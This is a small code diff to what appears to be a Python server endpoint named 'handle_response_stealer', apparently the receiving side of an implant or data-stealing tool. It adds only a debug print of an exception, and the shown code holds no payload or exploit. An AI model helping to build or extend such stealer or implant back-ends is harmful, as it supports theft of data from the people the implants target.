@@ -264,6 +264,7 @@ def handle_response_stealer():
         #     response_data = WyattWonderland.parsejson(response_data)
         return "Success", 200, {'Access-Control-Allow-Origin': config.clientURL}
     except Exception as error:
+        print(error)
         return error, 402, {'Access-Control-Allow-Origin': config.clientURL}
 
 #Implant response endpoint, in json
